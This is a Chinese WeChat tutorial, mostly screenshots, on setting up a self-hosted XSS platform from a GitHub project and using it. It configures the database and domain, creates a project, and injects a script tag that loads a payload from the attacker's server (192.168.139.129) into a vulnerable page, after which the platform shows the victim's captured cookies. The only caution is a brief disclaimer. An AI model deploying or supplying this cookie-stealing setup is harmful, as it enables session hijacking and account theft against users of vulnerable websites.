> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BeTEMmTX93w4B3jThDZgYA)

男孩子要娶，就要娶一见你就笑的女生，女孩子要嫁就要嫁能让你笑的男生。。。

----  网易云热评

一、下载平台源码、拷贝到我们网站的根目录

https://github.com/anwilx/xss_platform

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNN9Z5wVolZ2hSK1yTcEibroefAib3dTgGzoIOPyeJ6q683GMp4OUEobrww/640?wx_fmt=png)

二、修改相关参数

1、config.php，数据库用户、密码、还有 xss 平台的访问路径

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNYHewK0f8aTgSMqibGl23q2buFy8IJicgTQcBrBzLLsUjKvs8JakdycOw/640?wx_fmt=png)

2、导入 sql 文件，测试的时候没法导入，所以就手动创建了数据库

新建数据库

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNia7pbFT72PN5ibiaIPfhPj3AS85gIQPhNAXicPkfCMV08dJDolRwb37lRQ/640?wx_fmt=png)

打开 xssplatform.sql，将里面的 sql 语句执行一遍

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNYABpPEVnOx4ZLRpupLCFbnC3IzicRzUYdW8ytcGj4fqUz0r0a0LZDtg/640?wx_fmt=png)

3、更新站点域名，将作者的域名替换，一共有四处

将 module 模块里 "http://xsser.me" 替换为 "http://www.aiyouxss.com/xss");

4、修改 authtest 文件

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNW50d4OYcsYMEgUcZSYhP5icMXTXypXecdrQeJmfOpqWchcpIFfZ9jew/640?wx_fmt=png)

三、平台利用

1、注册一个账户

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNN4eHk6ezvkUxzX5TgJCXVZ0IWmL7gzedE5M6xWibeV2oAjoxrjTXIwaQ/640?wx_fmt=png)

2、创建一个项目

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNQf3H9UJ6IslWac30evt7l2FAYnLmYmpEIj5aNoNVcnkIiacLtWICjAw/640?wx_fmt=png)

3、配置相关信息，根据需要，添加模块

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNTT8wc8aGCdE5ygYRjicibwfeJVguHrNC5CgaTDWl961b25IatM8dR8DA/640?wx_fmt=png)

4、复制 script 里面代码，插入到存在 xss 漏洞的页面

```
<script src=http://192.168.139.129/xss/E3vbsa></script>
```

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNpoWHzCqgjYDSv4pzVsJiamz2RERXI6vxEMk1dExMt4sMichnmaCmwPBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNv97lVibPicsC5p2AicnkZpM7odk1RJPrMJGeRia5WnnjOibQGLicWCiaMolibg/640?wx_fmt=png)

5、打开 xss 平台，已获取对方 cookie

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNGWSCISYib4Gk6kFMa57jIYz9MQLJ3nrkBSrq62SuL0oU4rgl9Aic1iaLg/640?wx_fmt=png)

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

欢迎关注视频号：之乎者也吧

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNKCZ5krPUibzr6HYoggWkOwDcjlW6MF42UzA6r7A4754D2ibTdcnQCWrw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNGAImKv7tJTpZfxPFyCE2ZynOTHYib4yRRKnIW83t8co8UMGbZ1QRuXw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3Uibvib6DcdzzGPiaLBe20t34tNNwAhCVPNnvqBnicoZHyfsMo0t9LwqP2cOoXISOwxgiahem2ib76nTy8gRg/640?wx_fmt=jpeg)